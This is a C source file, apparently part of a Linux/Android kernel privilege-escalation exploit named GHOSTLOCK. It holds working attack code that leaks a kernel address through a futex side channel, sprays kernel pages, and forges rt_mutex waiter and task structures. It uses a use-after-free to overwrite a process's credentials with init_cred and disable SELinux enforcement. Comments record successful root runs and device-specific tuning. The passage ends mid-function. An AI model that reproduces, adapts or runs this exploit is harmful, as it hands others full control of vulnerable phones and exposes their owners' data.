#include "common.h"
#include "runtime_struct_offsets.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

static long long ms_since(struct timespec *t0) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0->tv_sec) * 1000LL +
         (now.tv_nsec - t0->tv_nsec) / 1000000LL;
}

/* f2fs rollback drops everything since the last checkpoint, so fsync at
 * stage boundaries or a panicking run loses its own lines */
void log_sync(void) {
  fflush(stdout);
  fsync(STDOUT_FILENO);
}

uintptr_t page_base;
uintptr_t last_mm_struct;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;

int pselect_custom_write;
uintptr_t pselect_custom_target;
int pselect_child_node;  /* Preserve initialized bytes when set. */

void set_pselect_write_mode(uintptr_t target, int mode) {
  pselect_custom_target = target;
  pselect_custom_write = mode;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
}

/* 5.10 GKI: rt_mutex_waiter has no wake_state/ww_ctx; prio sits at
 * offset 0x40 directly (6.1 has wake_state@0x40, prio@0x44). */
int is_5_10_waiter(void) {
  return active_offsets && active_offsets->uname_r &&
         strncmp(active_offsets->uname_r, "5.10.", 5) == 0;
}

int tcp_route_selected(void) {
  /* compact defaults to tcp; GHOSTLOCK_TCP_ROUTE=0 selects pselect */
  const char *s = getenv("GHOSTLOCK_TCP_ROUTE");
  if (s && *s && strcmp(s, "0") == 0) {
    return 0;
  }
  if (s && *s && strcmp(s, "1") == 0) {
    return 1;
  }
  /* 5.10 rejects the TCP zerocopy route with EINVAL: tcp_zerocopy_receive()
   * validates zc->address first (find_vma requires a real tcp zerocopy VMA),
   * and the 5.10 struct tcp_zerocopy_receive is only 0x28 bytes, so the
   * waiter_task/fake_lock words at 0x28/0x30 are never copied in. The
   * pselect route reaches SELinux permissive on 5.10; use it by default. */
  if (is_5_10_waiter()) {
    return 0;
  }
  return active_offsets && active_offsets->compact_waiter;
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  struct timespec boot;
  clock_gettime(CLOCK_BOOTTIME, &boot);
  double boot_ms = boot.tv_sec * 1000.0 + boot.tv_nsec / 1e6;
  /* same clock as printk's [timestamp], so a native log line maps onto dmesg */
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u boot_ms=%.0f "
             "attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms, attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)p0_kernel_phys_load,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(274, tid, &attr, 0);
  if (ret != 0) {
    pr_warning("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
  }
  return ret;
}

/* Bootloader-selected physical load address. */
uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;

uint64_t g_direct_map_end = DIRECT_MAP_END;

/* Selected entry's init_cred image address. */
uintptr_t g_init_cred_image;

void init_p0_profile(void) {
  pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
          (unsigned long long)p0_kernel_phys_load,
          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = p0_kernel_phys_load + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

/* Build a *liveable* fake root cred in the sprayed page.
 *
 * Two distinct failure modes were conflated before; both are addressed here.
 *
 * (1) POST-WRITE PANIC (the RC=255 that followed a successful ret=6).
 *     Once task->cred points at this copy, any put_cred() (fork/exec/exit)
 *     runs atomic_dec_and_test(&cred->usage). With usage==1 that hits 0 and
 *     calls __put_cred() -> cred_free() ->
 *       kmem_cache_free(cred_jar, <sprayed page>)   // not a slab object
 *     which corrupts the slab allocator and panics. Fix: usage is large AND
 *     odd, so the count can never reach 0 and cred_free() is never entered.
 *     (init_cred cannot be used directly either: it is .data, not .rodata,
 *     so get_cred() would not fault -- but freeing it on exit would destroy
 *     every kernel thread that still references it.)
 *
 * (2) NULL-DEREF ON FIRST USE. Cred was memset to 0, leaving user/user_ns/
 *     group_info NULL. The first fork() does get_uid(cred->user) and every
 *     capable() reads cred->user_ns -> immediate NULL deref. These must be
 *     the real &root_user / &init_user_ns / &init_groups. Note that
 *     init_cred + <offset> is the ADDRESS OF THE POINTER FIELD, not the
 *     object, so it cannot be reused as the value; the real symbol addresses
 *     have to be supplied. See GHOSTLOCK_CRED_PTRS below.
 *
 * The ODD usage also keeps the erased rbtree node RED, which skips
 * ____rb_erase_color() rebalancing (only black nodes rebalance). */
static void fill_init_cred_copy(unsigned char *p, size_t off) {
  unsigned char *c = p + off;
  /* Zero the whole struct: uid/gid/suid/sgid/euid/egid/fsuid/fsgid==0,
   * securebits==0, keyrings==NULL, rcu==0. */
  memset(c, 0, CRED_SIZE);

  int usage = 0x7fffffff; /* large -> never freed; odd -> RED node */
  const char *eu = getenv("GHOSTLOCK_W2_USAGE");
  if (eu && *eu) usage = (int)strtol(eu, NULL, 0);
  put32(c, CRED_USAGE_OFF, (uint32_t)usage);

  /* Full capability sets (CAP_FULL_SET): a uid-0 cred with empty caps is
   * not actually privileged -- capable() would still fail. */
  for (int i = 0; i < 5; i++) {
    put64(c, CRED_CAPS_OFF + (size_t)i * 8, 0xFFFFFFFFFFFFFFFFULL);
  }

  /* security = NULL: LSM blob. kfree(NULL) is a no-op and W1 has already
   * made SELinux permissive, so an empty blob is safe. */
  put64(c, CRED_SECURITY_OFF, 0);

  /* (2) continued -- user / user_ns / group_info. These are refcounted
   * kernel objects (root_user / init_user_ns / init_groups) and their
   * offsets move with the layout, so they are NOT guessed here: a wrong
   * pointer is worse than NULL because it corrupts instead of just oopsing.
   * Supply per target, e.g.
   *   GHOSTLOCK_CRED_PTRS=1 \
   *   GHOSTLOCK_CRED_USER_OFF=0x80 GHOSTLOCK_ROOT_USER_ADDR=0xffffff... \
   *   GHOSTLOCK_CRED_NS_OFF=0x88   GHOSTLOCK_INIT_NS_ADDR=0xffffff... \
   *   GHOSTLOCK_CRED_GI_OFF=0x90   GHOSTLOCK_INIT_GROUPS_ADDR=0xffffff...
   * (offsets from dump_btf.py, addresses from the target's System.map +
   *  KASLR slide). Until then they stay NULL and the process oopses on its
   * first fork() -- that is the known remaining gap, not a silent failure. */
  const char *cp = getenv("GHOSTLOCK_CRED_PTRS");
  if (cp && *cp && strcmp(cp, "0") != 0) {
    struct {
      const char *off_env; const char *addr_env; const char *what;
    } ptrs[] = {
      {"GHOSTLOCK_CRED_USER_OFF", "GHOSTLOCK_ROOT_USER_ADDR", "user"},
      {"GHOSTLOCK_CRED_NS_OFF", "GHOSTLOCK_INIT_NS_ADDR", "user_ns"},
      {"GHOSTLOCK_CRED_GI_OFF", "GHOSTLOCK_INIT_GROUPS_ADDR", "group_info"},
    };
    for (size_t i = 0; i < sizeof(ptrs) / sizeof(ptrs[0]); i++) {
      const char *o = getenv(ptrs[i].off_env);
      const char *a = getenv(ptrs[i].addr_env);
      if (!o || !*o || !a || !*a) {
        pr_warning("W2: %s needs %s and %s, left NULL\n",
                   ptrs[i].what, ptrs[i].off_env, ptrs[i].addr_env);
        continue;
      }
      size_t coff = (size_t)strtoull(o, NULL, 0);
      uint64_t addr = strtoull(a, NULL, 0);
      put64(c, coff, addr);
      pr_info("W2: cred->%s @0x%zx := 0x%016llx\n", ptrs[i].what, coff,
              (unsigned long long)addr);
    }
  }

  /* Diagnostic only: plant a self-referential sibling at +8/+16 in case a
   * future kernel variant does run the rebalance on this node. */
  const char *sp = getenv("GHOSTLOCK_W2_SIBPTR");
  if (sp && *sp) {
    uintptr_t self = (uintptr_t)c;
    put64(c, 8, self);
    put64(c, 16, self);
  }
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

/* 5.10 / marble: the full spray is ~540 child processes plus a memfd each.
 * On an 11GB device with MIUI resident that OOMs the system (oom_reaper
 * starts killing processes, which also takes out adbd) before the later
 * stages finish. Halve the two large ctxs; GHOSTLOCK_SPRAY_DIV can
 * override the divisor for tuning. */
static size_t spray_divisor(void) {
  const char *s = getenv("GHOSTLOCK_SPRAY_DIV");
  if (s && *s) {
    long v = strtol(s, NULL, 10);
    if (v >= 1) return (size_t)v;
  }
  return is_5_10_waiter() ? 2 : 1;
}

void prepare_ctxs(void) {
  size_t div = spray_divisor();
  prepare_ctx.mm_cnt = (8 / div) * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = ((1 + MM_PARTIALS) / div) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  int tcp = tcp_route_selected();
  long long payload_delta = tcp ? 0 : SKB_DATA_DELTA;
  size_t chunk_bias = tcp ? 0xe80 : (size_t)SKB_FRAG_BIAS;
  size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t)FAKE_TASK_OFF;

  uintptr_t payload_base = base + payload_delta;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + fake_task_off;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (pselect_custom_write) {
    fake_left = 0;
    if (pselect_custom_write == 2) {
      /* W2: write task->cred := init_cred (the classic commit_creds(&init_cred)
       * primitive, done by a raw pointer store). Evidence, not theory:
       *   gl3_root_success.log  in0=ffffff802a7a0930 (init_cred alias)  -> child uid = 0, root OK
       *   gl_w2fix_run1.log     in0=ffffff884c9b0200 (sprayed cred copy) -> kernel panic, reboot
       * init_cred is a *real, fully populated* cred: uid/gid 0, full caps, and
       * -- the part a hand-built copy gets wrong -- valid user / user_ns /
       * group_info pointers. A sprayed copy leaves those NULL, and getuid()
       * is from_kuid_munged(current_user_ns(), ...) -> NULL deref -> panic.
       * The old "init_cred faults on get_cred() into .rodata" theory is wrong:
       * System.map puts init_cred in 'D' (.data, writable), and we store the
       * pointer directly without going through commit_creds()/get_cred().
       * GHOSTLOCK_W2_VAL=fake restores the sprayed-copy variant for A/B. */
      uintptr_t w2val = data_addr(g_init_cred_image);
      const char *vv = getenv("GHOSTLOCK_W2_VAL");
      if (vv && strcmp(vv, "fake") == 0)
        w2val = payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
      fake_fops = w2val;
      fake_right = pselect_child_node ? w2val : 0;
    } else {
      /* W1 targets the initialized page at base+0x100. */
      fake_right = pselect_child_node ? (base + 0x100) : 0;
      fake_fops = payload_base + FOPS_TABLE_OFF;
    }
    fake_parent = pselect_custom_target - 8;
    pr_info("DBG-W2 mode=%d child=%d fake_right=%016zx fake_fops=%016zx fake_parent=%016zx target=%016zx\n",
            pselect_custom_write, pselect_child_node, fake_right, fake_fops, fake_parent, pselect_custom_target);
  }

  uintptr_t write_pc = fake_parent;
  uintptr_t write_right = fake_right;
  uintptr_t write_left = fake_left;
  uint64_t waiter_task = INIT_TASK;
  uint64_t task_group = ROOT_TASK_GROUP;
  uint64_t pi_top_task = INIT_TASK;

  int compact = active_offsets && active_offsets->compact_waiter;

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + chunk_bias;

    put32(p, LOCK_OFF + 0x00, 0);
    put64(p, LOCK_OFF + 0x08, fake_w0);
    /* GHOSTLOCK_NOWRITE=1: keep the UAF firing but make remove_waiter()
     * bail out at "if (!owner || !is_top_waiter) return;" -- owner == NULL
     * AND waiters.rb_leftmost != the erased waiter, so rt_mutex_dequeue_pi()
     * (the write) never runs. Binary-searches where the W1 panic lives:
     *   no panic  => it is inside the owner path (dequeue_pi/adjust_prio)
     *   still panics => it is at/before the tree erase, i.e. in the futex
     *                   requeue rollback itself, not in remove_waiter. */
    uintptr_t leftmost = fake_w0;
    uintptr_t lock_owner = 0;
    {
      const char *nw = getenv("GHOSTLOCK_NOWRITE");
      if (nw && *nw && strcmp(nw, "0") != 0) {
        leftmost = fake_w0 + 0x18;
      } else {
        lock_owner = INIT_TASK;
        const char *ow = getenv("GHOSTLOCK_OWNER");
        if (ow && strcmp(ow, "fake") == 0) lock_owner = fake_task;
      }
    }
    put64(p, LOCK_OFF + 0x10, leftmost);
    put64(p, LOCK_OFF + 0x18, lock_owner ? (lock_owner | 1) : 0);

    if (compact) {
      /* Words ride the erase relink: pc = value, rb_left = dest,
       * rb_right = 0 or the one-child arm also clobbers *(value) with
       * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
       * would leave the node parentless for enqueue_pi to trash
       * fake_task. prio > 120 gates this erase. The relink's second
       * write lands in *(value+8): cred image on W2, page rb_root at 0. */
      put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
      put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
      put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
      if (write_right) {
        put64(p, W0_OFF + 0x18, write_right);
        put64(p, W0_OFF + 0x20, 0);
        put64(p, W0_OFF + 0x28, pselect_custom_target);
      } else {
        put64(p, W0_OFF + 0x18, write_pc);    /* pi_tree_entry.rb_parent_color */
        put64(p, W0_OFF + 0x20, write_right); /* pi_tree_entry.rb_right */
        put64(p, W0_OFF + 0x28, write_left);  /* pi_tree_entry.rb_left */
      }
      put64(p, W0_OFF + 0x30, waiter_task); /* task */
      put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
      if (is_5_10_waiter()) {
        /* 5.10: no wake_state/ww_ctx; prio directly at 0x40, deadline 0x48. */
        put32(p, W0_OFF + 0x40, FAKE_WAITER_PRIO); /* prio */
        put32(p, W0_OFF + 0x44, 0);                /* padding */
        put64(p, W0_OFF + 0x48, 0);                /* deadline */
      } else {
        /* 6.1: wake_state@0x40, prio@0x44, deadline@0x48, ww_ctx@0x50. */
        put32(p, W0_OFF + 0x40, 0);           /* wake_state */
        put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
        put64(p, W0_OFF + 0x48, 0);           /* deadline */
        put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
      }
    } else {
      /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
      put64(p, W0_OFF + 0x00, 1);
      put64(p, W0_OFF + 0x08, 0);
      put64(p, W0_OFF + 0x10, 0);
      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    }

    /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
    uint32_t ft_prio_off       = compact ? active_offsets->task_prio
                                         : FAKE_TASK_PRIO_OFF;
    uint32_t ft_nprio_off      = compact ? active_offsets->task_normal_prio
                                         : FAKE_TASK_NORMAL_PRIO_OFF;
    uint32_t ft_tg_off         = compact ? active_offsets->task_sched_task_group
                                         : FAKE_TASK_TASK_GROUP_OFF;
    uint32_t ft_pi_lock_off    = compact ? active_offsets->task_pi_lock
                                         : FAKE_TASK_PI_LOCK_OFF;
    uint32_t ft_pi_wait_off    = compact ? active_offsets->task_pi_waiters
                                         : FAKE_TASK_PI_WAITERS_OFF;
    uint32_t ft_pi_top_off     = compact ? active_offsets->task_pi_top_task
                                         : FAKE_TASK_PI_TOP_TASK_OFF;
    uint32_t ft_pi_blocked_off = compact ? active_offsets->task_pi_blocked_on
                                         : FAKE_TASK_PI_BLOCKED_ON_OFF;

    put32(p, fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, fake_task_off + ft_prio_off, FAKE_TASK_PRIO);
    put32(p, fake_task_off + ft_nprio_off, FAKE_TASK_PRIO);
    put32(p, fake_task_off + ft_pi_lock_off, 0);
    /* Empty PI waiters avoid tree rebalancing during reinsertion. */
    put64(p, fake_task_off + ft_pi_wait_off, 0);
    put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
    put64(p, fake_task_off + ft_tg_off, task_group);
    put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
    put64(p, fake_task_off + ft_pi_blocked_off, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (pselect_custom_write >= 2) {
      fill_init_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(void) {
  struct timespec t_spray;
  clock_gettime(CLOCK_MONOTONIC, &t_spray);
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  int ks_verbose = 0;
  {
    const char *v = getenv("GHOSTLOCK_KS_VERBOSE");
    if (v && *v && strcmp(v, "1") == 0) ks_verbose = 1;
  }
  ks = kernelsnitch_setup(
      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, ks_verbose);
  pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
          cpu_count, ms_since(&t_spray));

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  pr_info("[spray] finding futex collisions... +%lldms\n",
          ms_since(&t_spray));
  {
    struct timespec t_wait;
    clock_gettime(CLOCK_MONOTONIC, &t_wait);
    int leak_status = 0;
    pid_t wp = 0;
    long long last_beat = 0;
    for (;;) {
      wp = waitpid(child_leak, &leak_status, WNOHANG);
      if (wp == child_leak) {
        break;
      }
      if (wp < 0) {
        pr_warning("waitpid leak child: %m\n");
        break;
      }
      long long waited = ms_since(&t_wait);
      if (waited >= 60000) {
        pr_warning("leak child stuck >60s, killing it\n");
        kill(child_leak, SIGKILL);
        waitpid(child_leak, NULL, 0);
        break;
      }
      if (waited - last_beat >= 2000) {
        size_t scan_done = ks->scan_done;
        size_t scan_total = ks->total_futexes;
        if (scan_done > scan_total) scan_done = scan_total;
        size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
        if (scan_id > (size_t)FUTEX_SZ) scan_id = (size_t)FUTEX_SZ;
        pr_info("[spray]   still finding collisions (%llds) %zu%% "
                "(futex 0x%zx/0x%zx)...\n",
                waited / 1000,
                scan_total ? scan_done * 100 / scan_total : 0,
                scan_id, (size_t)FUTEX_SZ);
        last_beat = waited;
      }
      usleep(50000);
    }
    if (wp == child_leak &&
        (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
      pr_warning("leak child exit status=%d\n", leak_status);
    }
  }
  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("[spray] futex collisions not found\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  pr_info("[spray] futex collisions found +%lldms\n",
          ms_since(&t_spray));
  kernelsnitch_bruteforce(ks);
  pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
          (size_t)ks->mm_struct, ms_since(&t_spray));
  uintptr_t leaked = ks->mm_struct;
  /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
  leaked |= (uintptr_t)0xf << 56;
  last_mm_struct = leaked;
  /* mm_structs live in the direct map */
  if (leaked == (uintptr_t)-1 ||
      leaked < KERNELSNITCH_IDENTITY_START ||
      leaked >= g_direct_map_end) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
